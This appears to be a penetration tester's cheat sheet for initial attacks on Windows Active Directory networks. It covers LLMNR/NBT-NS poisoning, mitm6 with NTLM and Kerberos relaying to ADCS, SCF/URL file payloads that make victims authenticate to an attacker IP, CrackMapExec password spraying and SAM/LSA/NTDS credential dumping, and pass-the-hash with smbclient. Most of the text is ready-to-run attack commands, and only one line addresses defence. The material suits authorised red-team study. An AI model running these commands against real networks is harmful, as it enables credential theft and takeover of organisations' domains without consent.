## Initial Network Attacks

Are you sat on a network without a user account? Want to start pwning some DA's? You'll maybe want to start by using one of these techniques.

Maybe you have some creds and want to check your access? I got you too, dude!

### LLMNR/NBTNS Poisoning

LLMNR and NBTNS is a protocol which is used as a fallback when DNS fails in the internal network. In the event of an environment with it enabled, users attempting to access a non-existant network share or file with a UNC path will have their initial DNS query fail. This is expected. LLMNR then broadcasts around the network and asks "Who has `<incorrectly spelt share>`?".

As an attacker on the network, we can use a tool such a Responder on Linux or Inveigh on Windows to respond to these requests. The response will ask the target to confirm who they are by sending their NTLMv2 hash. This can then either be relayed to machines that the user is a local admin on to get code execution. Provided SMB signing is disabled! NBTNS is the fallback after LLMNR fails and provides a similar service.

```bash
sudo responder -I eth0 -rdwv

# To relay
impacket-ntlmrelayx  --no-http-server -smb2support -t 10.10.10.10 -c 'whoami'
```

The best defence is simply to disable these protocols and ensure SMB signing is activated on all machines.

### Mitm6

Windows has a funny habit of preferring ipv6 on internal networks unless explicitly asked not to use it. This leads to potential authentication data being sent to malicious broadcasters pretending assign ipv6 addresses to requesting MAC addresses. This can be abused using the fantastic mitm6 from Fox-IT.

 https://github.com/dirkjanm/mitm6 

```bash
sudo mitm6 -d matrix.local
```

We then setup a relay to point at the domain controller.

```bash
python3 ntlmrelayx.py -6 -t ldaps://10.10.10.10 -wh fakewpad.matrix.local -l lootbox
```

When a machine in the vulnerable network gets restarted, ipv6 will broadcast and look for the DNS which will getr intercepted by MITM6. The lootbox will be full of incredible information when it captures information. If a user logs in, it should be possible to capture their login credentials. By default, ntlmrelay will create a user on the target.

If the target has an ADCS in their domain, with web enrollment enabled, we can use krbrelayx to relay kerberos. This is off the back of the incredible research by James Forshaw.

```bash
sudo krbrelayx.py --target http://adscert.matrix.local/certsrv/ -ip <your ip to bind dns> --victim dc04.matrix.local --adcs --template Machine
```

Then we'll run mitm6 specify the relay target as the ADCS.

```bash
sudo mitm6 --domain matrix.local --host-allowlist dc04.matrix.local --relay adcs.matrix.local -v
```

When the victim connects to our malicious mitm6 server, they'll attempt to update their DNS records. If we deny that, they will send their authentication via TCP to the krbrelayx DNS server. On the krbrelayx terminal, a certificate shoulld be captured. We can then use gettgtpkinit to convert it to a valid kerberos ccache ticket. This can also be done with Rubeus if you're a Windows lover.

```bash
python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz matrix.local/dc04$ dc04.ccache
```

With the kerberos ccache file, we'll request an s4u ticket for the administrative user and assign it to our local KRB5CCNAME environment variable and attempt to view the C$ drive of the target - Though you can psexec, wmiexec.. whatever you want really.


```bash
python gets4uticket.py kerberos+ccache://matrix.local\\dc04\$:dc04.ccache@dc04.matrix.local cifs/dc04.matrix.local@MATRIX.LOCAL administrator@matrix.local administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-smbclient -k matrix.local/adminstrator@dc04.matrix.local -no-pass
```

### SCF Attacks

The premise of the attack is simple, set up responder and drop a .scf or .url (maybe .lnk if my memory serves me correctly) into a writeable share that users are likely to visit. Once a user goes into the folder, their machine will attempt to run the script and connect back to your IP address. Either capture to crack, or you can relay as per the previous attacks.

 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share 

@files.scf
```bash
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
responder -wrf --lm -v -I eth0
```

Also works with .url files -> @files.url

```bash
[InternetShortcut]
URL=google.com
WorkingDirectory=whatever
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1
```

```bash
responder -I eth0 -v
```


### Crackmapexec

So many features now I don't even have notes on them all! Many protocols supported, examples below just show smb/winrm.

 https://github.com/Porchetta-Industries/CrackMapExec 

```bash
# Try a single user logon 
crackmapexec smb 10.10.10.10 -u 'Neo' -p 'Password!'

# Try to use a target list and a single user logon and tries to run the whoami command
crackmapexec smb targets.txt -u 'Neo' -p 'Password!' -x whoami

# Uses a target list, username list, and password list against local users
crackmapexec smb targets.txt -u usernames.txt -p passwords.txt --local-auth

# Uses a target list, username list, and a hash
crackmapexec smb targets.txt -u usernames.txt -H <NTLM>

# Uses a username list, hash file list, and continues after valid matches are found. No brute force means it tries user1 -> password1, user2 -> password2 
crackmapexec winrm 10.10.10.10 -u usernames.txt -H hashes.txt --no-bruteforce --continue-on-success 

# Uses a kerberos ccache file instead of credentials to authenticate via kerberos
export KRB5CCNAME=neo.ccache 
crackmapexec smb 10.10.10.10 --kerberos

# Check if DC is vulnerable to ZeroLogon, PetitPotam or noPac
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon/petitpotam/nopac

# Dump respective target creds/shares
crackmapexec smb 10.10.10.10 -u Neo -d matrix.local -H <hash> --sam / --lsa / --ntds / --shares
```

For an extensive, and I mean EXTENSIVE(!) list of features, check out the wiki. Awesome!

 https://wiki.porchetta.industries/ 


### Smbclient

```bash
# Using a null session to list shares
smbclient -L \\\\10.10.10.10\\

# Using a username/password to list shares
smbclient -L \\\\10.10.10.10\\ -U MATRIX/neo -P "passw0rd"

# Using a hash to connect to the ADMIN$ share
smbclient \\\\10.10.10.10\\ADMINS$ -U MATRIX/neo --pw-nt-hash 32f263cef0f67d74f57e13851526f1e2
```